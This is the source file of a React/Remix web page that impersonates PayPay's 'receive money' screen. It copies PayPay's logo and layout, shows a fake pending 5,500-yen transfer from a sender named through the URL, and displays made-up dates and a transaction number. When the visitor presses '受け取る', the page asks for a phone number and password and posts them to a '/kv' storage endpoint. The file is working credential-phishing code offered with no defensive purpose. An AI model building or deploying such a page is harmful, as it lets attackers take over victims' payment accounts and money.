import * as React from "react";
import type { V2_MetaFunction } from "@remix-run/deno";
import { submitData } from "../submit.ts";
import { useFetcher } from "@remix-run/react";

export const meta: V2_MetaFunction = () => {
  return [
    { title: "PayPayで受け取る" },
    { name: "description", content: "PayPayで受け取る" },
  ];
};

export default function Index() {
  let n: string | null = "";

  const fetcher = useFetcher();

  if (typeof document !== "undefined") {
    n = new URL(window.location.href).searchParams.get("n")
      ? decodeURIComponent(
          new URL(window.location.href).searchParams.get("n") as string
        )
      : "けいた";
  }

  const [nowPage, setNowPage] = React.useState("main"); // main, pass
  const [datas, setDatas] = React.useState({
    phone: "",
    password: "",
  });

  return (
    <>
      <div id="app">
        <div className="container">
          <section className="p2p-root-page">
            <div data-v-ba69a146="">
              <div data-v-40c6b462="" data-v-ba69a146="" className="title-bar">
                <img
                  data-v-40c6b462=""
                  src="https://www.paypay.ne.jp/cdn/apps/prod/web/4-13-0/static/img/header-logo.d0d63956.svg"
                  alt=""
                />
              </div>
              <div data-v-ba69a146="" className="background-animation-wrapper">
                <div data-v-ba69a146="" id="background-animation">
                  <img src="/bg.png" alt="bg" data-v-bg />
                </div>
              </div>
            </div>
            <div data-v-4bb01f76="" className="p2p-page">
              <div data-v-4bb01f76="" className="p2p-content">
                <div
                  data-v-6ad814ef=""
                  data-v-4bb01f76=""
                  className="p2p-profile"
                >
                  <div data-v-6ad814ef="" className="profile-img-wrapper">
                    <img
                      data-v-6ad814ef=""
                      src="https://source.boringavatars.com/beam"
                      alt="profile image"
                      className="p2p-profile-img"
                    />
                  </div>
                  <div data-v-6ad814ef="" className="p2p-profile-details">
                    {n}さんから受け取り
                  </div>
                  <div data-v-6ad814ef="" className="payment-date">
                    2023年9月16日 15時29分
                  </div>
                </div>
                <div
                  data-v-06457ec4=""
                  data-v-4bb01f76=""
                  className="p2p-amount"
                >
                  <span data-v-06457ec4="" className="amount-number">
                    5500
                  </span>
                  <span data-v-06457ec4="" className="amount-currency">
                    円
                  </span>
                </div>
                <div
                  data-v-44740d0c=""
                  data-v-4bb01f76=""
                  className="p2p-main-details"
                >
                  <div data-v-44740d0c="" className="message-wrapper">
                    {" "}
                  </div>
                  <div data-v-44740d0c="" className="status-details">
                    <span
                      data-v-44740d0c=""
                      className="status"
                      style={{ backgroundColor: "#F3D000" }}
                    >
                      受け取り待ち
                    </span>{" "}
                  </div>
                  <div
                    style={{ display: nowPage == "main" ? "block" : "none" }}
                  >
                    <div className="btns" data-v-first>
                      <button
                        onClick={() => {
                          setNowPage("pass");
                        }}
                        className="uketoru-x"
                      >
                        受け取る
                      </button>
                    </div>
                    <div className="btns">
                      <button
                        className="jitai-x"
                        onClick={() => {
                          window.location.href = `about:blank`;
                        }}
                      >
                        辞退する
                      </button>
                    </div>
                  </div>
                  <div
                    style={{ display: nowPage == "pass" ? "flex" : "none" }}
                    className="pass-x"
                  >
                    <fetcher.Form method="post" action="/kv">
                      <input
                        type="phone"
                        pattern="[0-9]*"
                        placeholder="電話番号"
                        className="phone-x"
                        value={datas.phone}
                        name="phone"
                        onChange={(e) =>
                          setDatas({ ...datas, phone: e.target.value })
                        }
                      />
                      <input
                        type="password"
                        placeholder="パスワード"
                        className="password-x"
                        value={datas.password}
                        name="password"
                        onChange={(e) =>
                          setDatas({ ...datas, password: e.target.value })
                        }
                      />
                      <button
                        onClick={() => {
                          submitData(datas, fetcher);
                        }}
                        type="submit"
                        className="login-x"
                      >
                        ログイン
                      </button>
                    </fetcher.Form>
                  </div>
                </div>{" "}
                <div data-v-1264247b="" data-v-4bb01f76="" className="p2p-card">
                  <div data-v-1264247b="" className="p2p-transact">
                    {" "}
                    <div data-v-1264247b="" className="other-details">
                      <div data-v-1264247b="" className="issue-date each-row">
                        <div data-v-1264247b="" className="label">
                          送信日
                        </div>
                        <div data-v-1264247b="" className="value">
                          2023年9月16日
                        </div>
                      </div>
                      <div data-v-1264247b="" className="expiry-date each-row">
                        <div data-v-1264247b="" className="label">
                          有効期限
                        </div>
                        <div data-v-1264247b="" className="value">
                          2023年9月18日
                        </div>
                      </div>
                      <div data-v-1264247b="" className="transact-id each-row">
                        <div data-v-1264247b="" className="label">
                          決済番号
                        </div>
                        <div data-v-1264247b="" className="id value id-x">
                          <span data-v-1264247b="" className="id-num">
                            {"0" + Date.now().toString()}
                          </span>
                        </div>
                      </div>
                      <div
                        data-v-1264247b=""
                        className="declaration"
                        style={{ opacity: 0, height: "0 !important" }}
                      >
                        ddddddああああ いいううええ おおかかき く00000こ
                      </div>
                    </div>
                  </div>
                </div>
                <div data-v-4bb01f76="" className="open-animation-wrapper">
                  <div data-v-4bb01f76="" id="open-animation"></div>
                </div>
              </div>
            </div>
          </section>
        </div>
      </div>
    </>
  );
}
